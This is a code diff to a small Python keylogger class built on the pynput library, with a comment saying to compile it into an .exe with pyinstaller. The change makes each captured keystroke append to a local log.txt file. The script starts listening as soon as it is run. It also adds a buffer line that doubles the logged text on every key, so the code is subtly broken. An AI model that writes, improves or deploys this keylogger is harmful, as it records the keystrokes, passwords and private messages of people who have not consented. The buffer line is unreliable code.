@@ -1,4 +1,3 @@
-
 ## pip install pynput for this API. And use pyinstaller to compile it to an .exe file. 
 import pynput.keyboard
 
@@ -8,9 +7,10 @@ class SimpleKeyLogger:
 
 
     def append_to_log(self, key_strike):
-     self.logger = self.logger + key_strike
+     self.logger  += self.logger + key_strike
      with open("log.txt", "a+", encoding = "utf-8") as new_file:
-        self.logger= ""
+        new_file.write(key_strike)
+        #self.logger= ""
 
     def evaluate_keys(self, key):
         try:
@@ -29,4 +29,3 @@ class SimpleKeyLogger:
             keyboard_listener.join()
 
 SimpleKeyLogger().start()
-
